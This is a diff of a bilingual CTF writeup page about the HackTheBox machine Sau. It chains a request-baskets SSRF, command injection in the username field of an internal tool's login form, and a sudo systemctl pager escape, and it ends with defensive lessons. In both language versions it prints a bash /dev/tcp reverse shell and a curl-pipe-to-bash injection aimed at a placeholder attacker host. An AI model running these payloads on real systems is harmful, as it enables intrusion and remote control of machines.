@@ -4,16 +4,25 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sau — HackTheBox CTF Writeup | CyberStefan</title>
-  <meta name="description" content="Sau HTB writeup — Easy HackTheBox machine. Request Basket SSRF + Maltrail RCE naar root. Stap voor stap uitgelegd door CyberStefan.">
+  <meta name="description" content="HackTheBox — Sau (Easy) Writeup Recon An initial Nmap scan of the target revealed three notable ports: Port State Service 22 open OpenSSH 8.2p1 80…">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="CyberStefan">
-  <meta property="og:title" content="Sau HackTheBox CTF Writeup — CyberStefan">
-  <meta property="og:description" content="Sau HTB writeup — Easy HackTheBox machine. Request Basket SSRF + Maltrail RCE naar root.">
+  <meta property="og:title" content="Sau CTF Writeup — CyberStefan">
+  <meta property="og:description" content="HackTheBox — Sau (Easy) Writeup Recon An initial Nmap scan of the target revealed three notable ports: Port State Service 22 open OpenSSH 8.2p1 80…">
   <meta property="og:url" content="https://cyberstefan.nl/writeup/sau/">
+  <meta property="og:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Sau CTF Writeup — CyberStefan">
+  <meta name="twitter:description" content="HackTheBox — Sau (Easy) Writeup Recon An initial Nmap scan of the target revealed three notable ports: Port State Service 22 open OpenSSH 8.2p1 80…">
+  <meta name="twitter:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <link rel="canonical" href="https://cyberstefan.nl/writeup/sau/">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="192x192" href="/favicon.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/assets/style.css">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Sau — HackTheBox CTF Writeup", "description": "HackTheBox — Sau (Easy) Writeup Recon An initial Nmap scan of the target revealed three notable ports: Port State Service 22 open OpenSSH 8.2p1 80…", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-01", "dateModified": "2026-04-01", "keywords": "Enumeration, Web, SSRF, RCE, Privesc, Linux, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/sau/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home", "item": "https://cyberstefan.nl/"}, {"@type": "ListItem", "position": 2, "name": "Sau Writeup", "item": "https://cyberstefan.nl/writeup/sau/"}]}</script>
 </head>
 <body>
 
@@ -32,44 +41,178 @@
         </svg>
         CTF Writeups
       </a>
+      <a href="/blog" style="color:var(--text-muted,#8b949e);font-size:.85rem;text-decoration:none;transition:color .15s" onmouseover="this.style.color='#e6edf3'" onmouseout="this.style.color='#8b949e'">Blog</a>
+      <a href="/resources/" style="color:var(--text-muted,#8b949e);font-size:.85rem;text-decoration:none;transition:color .15s" onmouseover="this.style.color='#e6edf3'" onmouseout="this.style.color='#8b949e'">Resources</a>
     </div>
     <div style="display:flex;align-items:center;gap:16px">
-    <div class="lang-flags-header">
-      <button class="lang-flag-btn" data-lang="nl" title="Nederlands">
-        <svg class="flag-svg-sm" viewBox="0 0 900 600">
-          <rect width="900" height="600" fill="#21468B"/>
-          <rect width="900" height="400" fill="#fff"/>
-          <rect width="900" height="200" fill="#AE1C28"/>
-        </svg>
-        <span class="lang-switch-code">NL</span>
-      </button>
-      <button class="lang-flag-btn" data-lang="en" title="English">
-        <svg class="flag-svg-sm" viewBox="0 0 60 30">
-          <rect width="60" height="30" fill="#012169"/>
-          <path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" stroke-width="6"/>
-          <path d="M0,0 L60,30 M60,0 L0,30" stroke="#C8102E" stroke-width="4"/>
-          <path d="M30,0 V30 M0,15 H60" stroke="#fff" stroke-width="10"/>
-          <path d="M30,0 V30 M0,15 H60" stroke="#C8102E" stroke-width="6"/>
-        </svg>
-        <span class="lang-switch-code">EN</span>
-      </button>
-    </div>
+      <div class="lang-flags-header">
+        <button class="lang-flag-btn" data-lang="nl" title="Nederlands">
+          <svg class="flag-svg-sm" viewBox="0 0 900 600"><rect width="900" height="600" fill="#21468B"/><rect width="900" height="400" fill="#fff"/><rect width="900" height="200" fill="#AE1C28"/></svg>
+          <span class="lang-switch-code">NL</span>
+        </button>
+        <button class="lang-flag-btn" data-lang="en" title="English">
+          <svg class="flag-svg-sm" viewBox="0 0 60 30"><rect width="60" height="30" fill="#012169"/><path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" stroke-width="6"/><path d="M0,0 L60,30 M60,0 L0,30" stroke="#C8102E" stroke-width="4"/><path d="M30,0 V30 M0,15 H60" stroke="#fff" stroke-width="10"/><path d="M30,0 V30 M0,15 H60" stroke="#C8102E" stroke-width="6"/></svg>
+          <span class="lang-switch-code">EN</span>
+        </button>
+      </div>
     </div>
   </div>
 </header>
 
-<main class="container" id="root">
-  <div class="loading">
-    <div class="spinner"></div>
-    <span id="loading-text">Loading...</span>
+<main class="container">
+  <a href="/" class="back-link">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+    <span class="lang-en">All writeups</span><span class="lang-nl" hidden>Alle writeups</span>
+  </a>
+
+  <div class="writeup-header">
+    <h1 class="writeup-title">Sau</h1>
+    <div class="writeup-meta">
+      <span class="badge badge-difficulty-Easy">Easy</span>
+      <span class="badge badge-platform-HackTheBox">HackTheBox</span>
+      <span class="badge" style="color:var(--muted);border-color:var(--border)">Completed</span>
+    </div>
+    <div class="writeup-tags"><span class="badge badge-tag">Enumeration</span><span class="badge badge-tag">Web</span><span class="badge badge-tag">SSRF</span><span class="badge badge-tag">RCE</span><span class="badge badge-tag">Privesc</span><span class="badge badge-tag">Linux</span></div>
+    <p class="writeup-date" style="margin-top:10px">
+      <span class="lang-en">1 April 2026</span>
+      <span class="lang-nl" hidden>1 april 2026</span>
+    </p>
+  </div>
+
+  <div class="writeup-body lang-en"><h2>HackTheBox — Sau (Easy) Writeup</h2>
+<h2>Recon</h2>
+<p>An initial Nmap scan of the target revealed three notable ports:</p>
+<pre><code>nmap -sC -sV -p- -oN sau_full.nmap &lt;target_ip&gt;</code></pre>
+<p>| Port  | State    | Service                              |<br>|-------|----------|--------------------------------------|<br>| 22    | open     | OpenSSH 8.2p1                        |<br>| 80    | filtered | HTTP (not directly reachable)        |<br>| 55555 | open     | Golang HTTP server — request-baskets v1.2.1 |</p>
+<p>Port 80 being <strong>filtered</strong> was immediately interesting — it suggested a web service bound to localhost or blocked by firewall rules, potentially reachable only from the inside.</p>
+<p>Browsing to port 55555 revealed <strong>request-baskets v1.2.1</strong>, an open-source service that creates temporary HTTP endpoints (&quot;baskets&quot;) and captures incoming requests. Research quickly turned up <strong>CVE-2023-27163</strong>, a Server-Side Request Forgery (SSRF) vulnerability that allows an attacker to configure a basket&#x27;s <code>forward_url</code> to an arbitrary internal address and have the response proxied back to the client. This made the filtered port 80 a prime target.</p>
+<h2>Exploitation</h2>
+<h3>Step 1 — SSRF via request-baskets (CVE-2023-27163)</h3>
+<p>A new basket was created through the web UI on port 55555 with the following configuration:</p>
+<p>| Setting          | Value                  |<br>|------------------|------------------------|<br>| <code>forward_url</code>    | <code>http://127.0.0.1:80</code>  |<br>| <code>proxy_response</code> | <code>true</code>                 |</p>
+<p>Accessing the generated basket URL (<code>http://&lt;target_ip&gt;:55555/&lt;basket_id&gt;</code>) now transparently forwarded requests to the internal service on port 80 and returned its responses. The internal application identified itself as <strong>Mailtrail v0.53</strong>.</p>
+<h3>Step 2 — Unauthenticated OS Command Injection in Mailtrail v0.53</h3>
+<p>Mailtrail v0.53 is vulnerable to an <strong>unauthenticated OS command injection</strong> in the <code>username</code> parameter of the login form. The parameter value is passed unsanitized to a shell command on the server.</p>
+<p>A reverse shell was staged as follows:</p>
+<p>1. <strong>Create the payload file</strong> (<code>shell.sh</code>) on the attacker machine:</p>
+<pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/9001 0&gt;&amp;1</code></pre>
+<p>2. <strong>Serve the payload</strong> via a Python HTTP server:</p>
+<pre><code>python3 -m http.server 8000</code></pre>
+<p>3. <strong>Start a Netcat listener</strong>:</p>
+<pre><code>nc -lvnp 9001</code></pre>
+<p>4. <strong>Trigger the injection</strong> by sending a crafted login request through the SSRF basket:</p>
+<pre><code>curl &#x27;http://&lt;target_ip&gt;:55555/&lt;basket_id&gt;/login&#x27; \
+  --data &#x27;username=;curl+http://&lt;attacker_ip&gt;:8000/shell.sh|bash&#x27;</code></pre>
+<p>The semicolon breaks out of the original command context, downloads <code>shell.sh</code>, and pipes it into <code>bash</code>.</p>
+<p><strong>Result:</strong> A reverse shell as the user <strong><code>puma</code></strong>, and access to <code>user.txt</code>.</p>
+<h2>Privilege Escalation</h2>
+<p>With a shell as <code>puma</code>, the first step was checking sudo privileges:</p>
+<pre><code>puma@sau:~$ sudo -l
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
+<p><code>systemctl status</code> invokes a <strong>pager</strong> (typically <code>less</code>) when the output exceeds the terminal height. Because the command runs as <strong>root</strong> via <code>sudo</code>, the pager also runs as root.</p>
+<p><code>less</code> allows spawning a shell with the <code>!</code> command:</p>
+<pre><code>puma@sau:~$ sudo /usr/bin/systemctl status trail.service</code></pre>
+<p>Once inside the <code>less</code> pager:</p>
+<pre><code>!sh</code></pre>
+<p><strong>Result:</strong> A root shell, and access to <code>root.txt</code>.</p>
+<p>&gt; This technique is documented on [GTFOBins — systemctl](https://gtfobins.github.io/gtfobins/systemctl/).</p>
+<h2>Lessons Learned</h2>
+<p>1. <strong>SSRF as a gateway:</strong> A seemingly low-impact SSRF in request-baskets turned a filtered, &quot;unreachable&quot; internal service into a fully accessible attack surface. Never assume network-level filtering is sufficient when an SSRF vector exists on the same host.</p>
+<p>2. <strong>Patch third-party components:</strong> Both request-baskets (v1.2.1) and Mailtrail (v0.53) were running known-vulnerable versions with public CVEs and exploit code. Timely patching of either would have broken the kill chain.</p>
+<p>3. <strong>Sudo + pagers = danger:</strong> Granting passwordless <code>sudo</code> on <code>systemctl status</code> appears harmless but implicitly grants root shell access through the pager. Least-privilege policies should account for the transitive capabilities of every invoked subprocess. Using <code>LESSSECURE=1</code> or replacing the pager with <code>cat</code> would mitigate this.</p>
+<p>4. <strong>Defense in depth matters:</strong> The compromise required chaining three distinct weaknesses (SSRF → command injection → sudo misconfiguration). Mitigating any single link would have prevented full compromise.</p></div>
+  <div class="writeup-body lang-nl" hidden><h2>HackTheBox — Sau (Easy) Writeup</h2>
+<h2>Verkenning</h2>
+<p>Een initiële Nmap-scan van het doelwit onthulde drie opvallende poorten:</p>
+<pre><code>nmap -sC -sV -p- -oN sau_full.nmap &lt;target_ip&gt;</code></pre>
+<p>| Poort | Status    | Dienst                                        |<br>|-------|-----------|-----------------------------------------------|<br>| 22    | open      | OpenSSH 8.2p1                                 |<br>| 80    | gefilterd | HTTP (niet direct bereikbaar)                 |<br>| 55555 | open      | Golang HTTP-server — request-baskets v1.2.1   |</p>
+<p>Poort 80 was <strong>gefilterd</strong> — meteen interessant. Dit wees op een webdienst die gebonden was aan localhost of geblokkeerd door firewallregels, en mogelijk alleen bereikbaar van binnenuit.</p>
+<p>Browsen naar poort 55555 onthulde <strong>request-baskets v1.2.1</strong>, een open-source dienst die tijdelijke HTTP-eindpunten (&quot;baskets&quot;) aanmaakt en inkomende verzoeken opslaat. Onderzoek bracht snel <strong>CVE-2023-27163</strong> aan het licht: een Server-Side Request Forgery (SSRF)-kwetsbaarheid waarmee een aanvaller de <code>forward_url</code> van een basket naar een willekeurig intern adres kan configureren en de reactie teruggespiegeld krijgt. Gefilterde poort 80 was daarmee een voor de hand liggend doelwit.</p>
+<h2>Uitbuiting</h2>
+<h3>Stap 1 — SSRF via request-baskets (CVE-2023-27163)</h3>
+<p>Via de webinterface op poort 55555 werd een nieuwe basket aangemaakt met de volgende instelling:</p>
+<p>| Instelling       | Waarde                 |<br>|------------------|------------------------|<br>| <code>forward_url</code>    | <code>http://127.0.0.1:80</code>  |<br>| <code>proxy_response</code> | <code>true</code>                 |</p>
+<p>Het bezoeken van de gegenereerde basket-URL (<code>http://&lt;target_ip&gt;:55555/&lt;basket_id&gt;</code>) stuurde verzoeken nu transparant door naar de interne dienst op poort 80 en gaf de reacties terug. De interne applicatie identificeerde zichzelf als <strong>Mailtrail v0.53</strong>.</p>
+<h3>Stap 2 — Niet-geauthenticeerde OS Command Injection in Mailtrail v0.53</h3>
+<p>Mailtrail v0.53 is kwetsbaar voor een <strong>niet-geauthenticeerde OS command injection</strong> in de <code>username</code>-parameter van het inlogformulier. De parameterwaarde wordt zonder sanitisatie doorgegeven aan een shell-commando op de server.</p>
+<p>Een reverse shell werd als volgt opgezet:</p>
+<p>1. <strong>Maak het payload-bestand aan</strong> (<code>shell.sh</code>) op de aanvallende machine:</p>
+<pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/9001 0&gt;&amp;1</code></pre>
+<p>2. <strong>Serveer de payload</strong> via een Python HTTP-server:</p>
+<pre><code>python3 -m http.server 8000</code></pre>
+<p>3. <strong>Start een Netcat listener</strong>:</p>
+<pre><code>nc -lvnp 9001</code></pre>
+<p>4. <strong>Activeer de injectie</strong> door een speciaal crafted inlogverzoek te sturen via de SSRF-basket:</p>
+<pre><code>curl &#x27;http://&lt;target_ip&gt;:55555/&lt;basket_id&gt;/login&#x27; \
+  --data &#x27;username=;curl+http://&lt;attacker_ip&gt;:8000/shell.sh|bash&#x27;</code></pre>
+<p>De puntkomma breekt uit de oorspronkelijke commandocontext, downloadt <code>shell.sh</code> en stuurt het door naar <code>bash</code>.</p>
+<p><strong>Resultaat:</strong> Een reverse shell als gebruiker <strong><code>puma</code></strong>, en toegang tot <code>user.txt</code>.</p>
+<h2>Privilege Escalation</h2>
+<p>Met een shell als <code>puma</code> was de eerste stap het controleren van sudo-rechten:</p>
+<pre><code>puma@sau:~$ sudo -l
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
+<p><code>systemctl status</code> roept een <strong>pager</strong> (doorgaans <code>less</code>) aan wanneer de uitvoer de terminalgrootte overschrijdt. Omdat het commando via <code>sudo</code> als <strong>root</strong> draait, draait de pager ook als root.</p>
+<p><code>less</code> staat toe een shell te starten met het <code>!</code>-commando:</p>
+<pre><code>puma@sau:~$ sudo /usr/bin/systemctl status trail.service</code></pre>
+<p>Eenmaal in de <code>less</code>-pager:</p>
+<pre><code>!sh</code></pre>
+<p><strong>Resultaat:</strong> Een root-shell, en toegang tot <code>root.txt</code>.</p>
+<p>&gt; Deze techniek staat gedocumenteerd op [GTFOBins — systemctl](https://gtfobins.github.io/gtfobins/systemctl/).</p>
+<h2>Geleerde lessen</h2>
+<p>1. <strong>SSRF als toegangspoort:</strong> Een ogenschijnlijk laag-risico SSRF in request-baskets maakte van een gefilterde, &quot;onbereikbare&quot; interne dienst een volledig toegankelijk aanvalsoppervlak. Ga nooit ervan uit dat netwerkfiltering voldoende is zolang er een SSRF-vector bestaat op dezelfde host.</p>
+<p>2. <strong>Patch externe componenten:</strong> Zowel request-baskets (v1.2.1) als Mailtrail (v0.53) draaiden op kwetsbare versies met bekende CVE&#x27;s en publiek beschikbare exploitcode. Tijdig patchen van één van beide had de aanvalsketen gebroken.</p>
+<p>3. <strong>Sudo + pagers = gevaar:</strong> Het verlenen van wachtwoordloze <code>sudo</code> op <code>systemctl status</code> lijkt onschuldig, maar geeft impliciet root-shell toegang via de pager. Least-privilege-beleid moet rekening houden met de transitieve mogelijkheden van elk aangeroepen subproces. Het gebruik van <code>LESSSECURE=1</code> of het vervangen van de pager door <code>cat</code> zou dit verhelpen.</p>
+<p>4. <strong>Defense in depth telt:</strong> De aanval vereiste het koppelen van drie afzonderlijke zwakheden (SSRF → command injection → sudo-misconfiguratie). Het aanpakken van één enkele schakel had volledige compromittering voorkomen.</p></div>
+
+  <div style="margin-top:32px;padding:18px 20px;background:#161b22;border:1px solid #30363d;border-radius:10px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap">
+    <span class="lang-en" style="font-size:.9rem;color:#cdd9e5">Want to try this CTF challenge yourself?</span>
+    <span class="lang-nl" hidden style="font-size:.9rem;color:#cdd9e5">Wil je deze CTF ook proberen?</span>
+    <a href="https://hacktheboxltd.sjv.io/enroEz" target="_blank" rel="noopener sponsored" style="display:inline-flex;align-items:center;gap:6px;background:#58a6ff;color:#0d1117;font-size:.82rem;font-weight:600;padding:8px 16px;border-radius:6px;text-decoration:none;white-space:nowrap">
+      <span class="lang-en">Click here</span><span class="lang-nl" hidden>Ga dan hier naartoe</span>
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+    </a>
+  </div>
+
+  <div style="margin-top:12px;padding:14px 18px;background:#0d1117;border:1px solid #21262d;border-radius:8px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap">
+    <span class="lang-en" style="font-size:.82rem;color:#6e7681">🔒 Protect your IP while hacking — use a VPN</span>
+    <span class="lang-nl" hidden style="font-size:.82rem;color:#6e7681">🔒 Bescherm je IP tijdens het hacken — gebruik een VPN</span>
+    <a href="https://go.nordvpn.net/aff_c?offer_id=15&amp;aff_id=146180&amp;url_id=902" target="_blank" rel="noopener sponsored" style="font-size:.78rem;color:#58a6ff;text-decoration:none;white-space:nowrap;flex-shrink:0">NordVPN →</a>
   </div>
 </main>
 
 <footer>
-  <div class="container" id="footer-text"></div>
+  <div class="container" id="footer-text">
+    <span class="lang-en">Built with FastAPI &amp; SQLite &mdash; automated via <code>ctf-writeup</code> CLI</span>
+    <span class="lang-nl" hidden>Gebouwd met FastAPI &amp; SQLite &mdash; geautomatiseerd via <code>ctf-writeup</code> CLI</span>
+  </div>
 </footer>
 
-<script>window._WRITEUP_ID = 1;</script>
-<script src="/assets/writeup.js"></script>
+<script>
+(function () {
+  var l = localStorage.getItem('lang') || 'en';
+  document.documentElement.lang = l;
+  if (l === 'nl') {
+    document.querySelectorAll('.lang-en').forEach(function(e){e.hidden=true;});
+    document.querySelectorAll('.lang-nl').forEach(function(e){e.hidden=false;});
+  }
+  document.querySelectorAll('.lang-flag-btn').forEach(function(btn){
+    btn.classList.toggle('active', btn.dataset.lang === l);
+    btn.addEventListener('click', function(){
+      var nl = btn.dataset.lang;
+      localStorage.setItem('lang', nl);
+      document.documentElement.lang = nl;
+      document.querySelectorAll('.lang-flag-btn').forEach(function(b){
+        b.classList.toggle('active', b.dataset.lang === nl);
+      });
+      document.querySelectorAll('.lang-en').forEach(function(e){e.hidden=(nl!=='en');});
+      document.querySelectorAll('.lang-nl').forEach(function(e){e.hidden=(nl!=='nl');});
+    });
+  });
+})();
+</script>
 </body>
 </html>
